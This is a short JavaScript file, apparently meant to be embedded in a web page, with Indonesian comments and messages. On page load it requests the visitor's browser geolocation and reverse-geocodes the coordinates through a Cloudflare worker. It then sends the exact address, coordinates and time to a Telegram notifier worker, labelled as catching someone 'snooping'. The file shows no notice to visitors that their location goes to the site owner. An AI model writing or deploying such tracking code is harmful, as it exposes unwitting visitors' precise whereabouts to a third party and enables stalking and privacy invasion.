// visitor-tracker.js
// Ganti URL Worker  milik Anda
const GEO_WORKER_URL = 'https://geo-worker.awalgultom123.workers.dev/';        // Ganti dengan URL worker Anda
const TELEGRAM_WORKER_URL = 'https://telegram-notifier.awalgultom123.workers.dev/'; // Ganti dengan URL telegram Anda

async function kirimNotifikasi(pesan) {
    try {
        const response = await fetch(TELEGRAM_WORKER_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ message: pesan })
        });
        if (!response.ok) console.error('Telegram worker error');
        else console.log('Notifikasi terkirim');
    } catch (error) {
        console.error('Gagal kirim notifikasi:', error);
    }
}

if ('geolocation' in navigator) {
    navigator.geolocation.getCurrentPosition(async (position) => {
        const lat = position.coords.latitude;
        const lng = position.coords.longitude;
        try {
            const geoResponse = await fetch(GEO_WORKER_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ lat, lng })
            });
            const geoData = await geoResponse.json();
            const alamat = geoData.address || 'Alamat tidak ditemukan';
            const waktu = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
            const pesan = `⚠️ Ada yang kepoin nih! ⚠️\n\nWaktu: ${waktu}\nLokasi Real: ${alamat}\nKoord: ${lat}, ${lng}`;
            kirimNotifikasi(pesan);
        } catch (error) {
            console.error('Gagal ambil alamat:', error);
            kirimNotifikasi(`⚠️ Ada yang kepoin, tapi gagal dapatkan alamat. Error: ${error.message}`);
        }
    }, (error) => {
        console.error('Gagal dapatkan lokasi pengunjung:', error);
        kirimNotifikasi(`⚠️ Ada yang kepoin, tapi pengunjung menolak izin lokasi.`);
    });
} else {
    console.log('Geolocation tidak didukung browser ini.');
    kirimNotifikasi('⚠️ Ada yang kepoin, tapi browser tidak mendukung geolokasi.');
}
